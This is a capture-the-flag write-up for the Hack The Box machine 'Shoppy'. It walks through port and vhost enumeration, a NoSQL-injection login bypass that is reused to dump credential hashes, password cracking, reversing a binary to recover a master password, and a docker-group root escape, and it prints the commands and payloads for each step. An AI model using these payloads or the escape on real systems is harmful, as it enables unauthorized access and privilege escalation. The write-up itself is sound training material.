<h1 style="margin-bottom:20px; text-align:center;">Shoppy</h1>

Welcome back here is an old Easy machine called Shoppy. As always we started out with an nmap scan 

```c
# Nmap 7.92 scan initiated Thu Dec  8 15:54:43 2022 as: nmap -sS -sC -sV -oN scans/nmap.txt 10.10.11.180
Nmap scan report for 10.10.11.180
Host is up (0.060s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec  8 15:54:54 2022 -- 1 IP address (1 host up) scanned in 10.68 seconds
```

The usual ports so visited the site hosted onm the port 80. 

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/31b7374f-a61f-4a8f-a185-2100c1317592" load="lazy"></img>

From the site we can only see a countdown, and nothing else so we can try to run gobuster to check for the hidden enpoints

```c
/ADMIN                (Status: 302) [Size: 28] [--> /login]                                                          │
/Admin                (Status: 302) [Size: 28] [--> /login]                                                          │
/Login                (Status: 200) [Size: 1074]                                                                     │
/admin                (Status: 302) [Size: 28] [--> /login]                                                          │
/assets               (Status: 301) [Size: 179] [--> /assets/]                                                       │
/css                  (Status: 301) [Size: 173] [--> /css/]                                                          │
/exports              (Status: 301) [Size: 181] [--> /exports/]                                                      │
/favicon.ico          (Status: 200) [Size: 213054]                                                                   │
/fonts                (Status: 301) [Size: 177] [--> /fonts/]                                                        │
/images               (Status: 301) [Size: 179] [--> /images/]                                                       │
/js                   (Status: 301) [Size: 171] [--> /js/]                                                           │
/login                (Status: 200) [Size: 1074]
```

From the above results seems that we have a login at `/admin` endpoint.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/998061d2-b88b-4d3e-8dff-a6e818614f21" load="lazy"></img>


Except to this, the others enpoints are unrechable.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/45f4bab3-bf70-45f3-9ef1-099ca91b5856" load="lazy"></img>

Because we can’t find any vector to priv-esc, neither with searchsploit, we can try to bruteforce using as username `admin` with hydra, but noyhing. 
So because we have nothing to do we can try to run again gobuster scan, and look forr some hidden `vhost` but with different wordlists like the `seclist.`

```c
Wordlist used dns mode :
	/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt // Nothing
	/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt // Nothing
	gbuster_medium_2-3.txt // Useless
```

After a lot of fuzzing we have found the right wordlist which turned out to be the `bitquark-to1000000`

```bash
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Shoppy]                                                               
└─$ gobuster vhost --wordlist=/usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --url="http://shoppy.htb" --output=scans/vhost_bitquark.txt                                                                   
===============================================================                                                      
Gobuster v3.1.0                                                                                                     
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                        
===============================================================                                                      
[+] Url:          http://shoppy.htb                                                                                  
[+] Method:       GET                                                                                                
[+] Threads:      10                                                                                                 
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt                      
[+] User Agent:   gobuster/3.1.0                                                                                     
[+] Timeout:      10s                                                                                                
===============================================================                                                      
2022/12/10 05:40:13 Starting gobuster in VHOST enumeration mode                                                      
===============================================================                                                      
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]                                                              
                                                                                                                     
===============================================================                                                      
2022/12/10 05:47:07 Finished                                                                                         
===============================================================
```

So now we have to change the /etc/hosts and visit the new site

```c
10.10.11.180 shoppy.htb mattermost.shoppy.htb
```

Let’s visit the website by specifing the subdomain just found.
<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/d537b427-b2f4-4ea3-80b5-8f97765b0bb0" load="lazy"></img>

It redirects us into a new login form where now we can try to inject some basic codes to spot login-vulnerabilities.

```sql
SELECT * FROM users WHERE admin = '1' OR 1 = 1--' AND password = '2'                                                         │
```

I have tried some of the basic sql injections and i have even done a bruteforce with burpsuite but nothing came out

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/8ba312bc-74ea-4744-864d-19ed4c787d4c" load="lazy"></img>

Tried with different types of injections, following the examples provided by hacktricks.
From the new site seems to be nothing, so tried to inject code into the first login, to understand why does it give us error  504

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/8a03f7e9-95e5-4c36-807a-daceea6b1133" load="lazy"></img>

From the request above we can see that if we insert the character ‘ we get the timeout, but even if we use the ‘\’ character, so maybe it is a nosql service. It could be the right way because the syntax is a bit different from a normal sql server, and that should be the reason why none normal-sql injection payload worked.

Knowing this we can look at the [hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection) database for the nosql injections.

From the guide there is a payload to test against the server

```sql
' || 1==1%00
```

That gave us a strange input

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/6473c771-190a-4e20-a3a8-13497f99869b" load="lazy"></img>

It seems to be an id cookie that let us to enter the site, by the way if i do it manually i get a timeout, while if i do it via curl

```html
curl -i "http://shoppy.htb" --cookie connect.sid=s%3Ahdxw-vROpmbcXdAcVTEKT6gDxwsXxUBy.ROrWwvDrUTiN7eISKG0fIwIhbiQTkSusXuzkXdvQGAc 

HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Sat, 10 Dec 2022 15:45:07 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 2178
Connection: keep-alive
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 01 Feb 2022 09:38:44 GMT
ETag: W/"882-17eb4a698a0"

<!DOCTYPE html>
<html lang="en-US">
    <head>
        <meta charset="utf-8">
        <title>
            Shoppy Wait Page
        </title>
        <link href="favicon.png" rel="shortcut icon" type="image/png">
        <link href="css/roboto.css" rel="stylesheet" type="text/css">
        <link href="css/loader.css" rel="stylesheet" type="text/css">
        <link href="css/normalize.css" rel="stylesheet" type="text/css">
        <link rel="stylesheet" href="css/font-awesome.min.css">
        <link href="css/style.css" rel="stylesheet" type="text/css">
        <script src="js/jquery.js"></script>
    </head>
    <body>
        <div class="preloader">
            <div class="loading">
                <h2>
                    Loading...
                </h2>
                <span class="progress"></span>
            </div>
        </div>
        <div class="wrapper">
            <ul class="scene unselectable" data-friction-x="0.1" data-friction-y="0.1" data-scalar-x="25" data-scalar-y="15" id="scene">
                <li class="layer" data-depth="0.00">
                </li>
                <li class="layer" data-depth="0.10">
                    <div class="background">
                    </div>
                </li>
                <li class="layer" data-depth="0.20">
                    <div class="title">
                        <h2>
                            SHOPPY
                        </h2>
                        <span class="line"></span>
                    </div>
                </li>
                <li class="layer" data-depth="0.30">
                    <div class="hero">
                        <h1 id="countdown">
                            Shoppy beta coming soon ! Stay tuned for beta access !
                        </h1>
                        <p class="sub-title">
                            Shoppy beta coming soon ! Stay tuned for beta access !
                        </p>
                    </div>
                </li>
            </ul>
        </div>
        <script src="js/plugins.js"></script>
        <script src="js/jquery.countdown.min.js"></script>
        <script src="js/main.js"></script>
    </body>
</html>
```

The input is right but we have to do a slight change to make it not timeout us. We need to remove the `%00` and insert the name admin that is right.

```sql
admin'||'1=1
```

And here is the site as login

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/9a472922-f18a-4589-a507-dece82b1f24c" load="lazy"></img>

As you can see here we can search for users, but there is none useful, so because before we broke with the NoSqlInjection  we can try to use it again.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/04cbc5ea-e709-4c84-9af0-fcc349c25618" load="lazy"></img>

It worked! Now we can press a button where all the creds are stored 

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/db2b9614-af03-41f1-9e31-cb84e1ea5b79" load="lazy"></img>

Maybe they can be used to login into the other login form

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/b2ab6ee2-df01-4ba2-ab23-9763c1bf7c21" load="lazy"></img>

The key doesn’t work maybe it is encoded, or  even hashed, so we can try to use crackstation to get the real password

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/61c34cfc-c21e-4417-a62b-56337a0070a9" load="lazy"></img>

The only password that worked was the one of the user josh, which is `remembermethisway`, that we can use to log.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/53ede517-f8eb-4db3-a731-0e15cc6c43cd" load="lazy"></img>

We are in! Now we have to find a way to upload a rev-shell

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/0aa95f4e-5bf6-4c46-8b83-e18a6c5e6328" load="lazy"></img>

Mmh.. seems that we don’t even need a rev-shell because we have the credentials for the user jaeger, let’s try them via ssh.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/67b581c7-16a4-4901-9227-7a914d1a6be8" load="lazy"></img>

Now we can get the user flag

```bash
jaeger@shoppy:~$ cat user.txt 
04124b35540de00cbd87a6e929321383
```

# Root.txt

Here it comes the priv-esc part where we neet to become root.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/a9af7387-26c3-4d43-9e2d-e77b3baec80f" load="lazy"></img>

By running `sudo -l` we can see that we are able to run an executable as `user :: deploy`, so we can try to run it

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/6d1a890a-d3e5-4ea2-b509-d148f66061af" load="lazy"></img>

It requires the master password which is neither the used one for the login and nor the provided one from the site
Because we can’t read the code we can take the executable and analyze it with gdb or even Ghidra, here we will use ghidra.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/c2587a5c-c905-4af0-aaa3-8da5d2dbd185" load="lazy"></img>

As you can see it creates the password character by character till he creates the “Sample” passphrase.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/b1b43b33-8971-402b-a876-8ebbdd87c7ab" load="lazy"></img>

It worked now that we have the credentials for `user :: deploy` we can become it.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/8bb1baf5-098e-4211-88df-43f007d8d2ec" load="lazy"></img>

Now we can try to run linpeas to check for some vulnerability

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/4633f090-cf56-47bb-8460-c510b227e1bb" load="lazy"></img>

As you can see we are in the docker group so we can run the command itself and if we look at [GTFObins](https://gtfobins.github.io/gtfobins/docker/) we  can see that there is a way to get the root shell.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/9365f16e-cb81-406b-80b7-73cf5f11aae6" load="lazy"></img>

So we can try to run it and see if we get the root shell.

```bash
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# bash -p
root@32b576fa8df3:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@32b576fa8df3:/# cd /root/
root@32b576fa8df3:~# cat root.txt 
64f5d271052f85860c603c9fcfb16495
```
We did it!

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/154eb68b-47ef-49df-914d-fb03f5998f8b" load="lazy"></img>

And here is how to solve the Shoppy-HTB machine 0xCY@
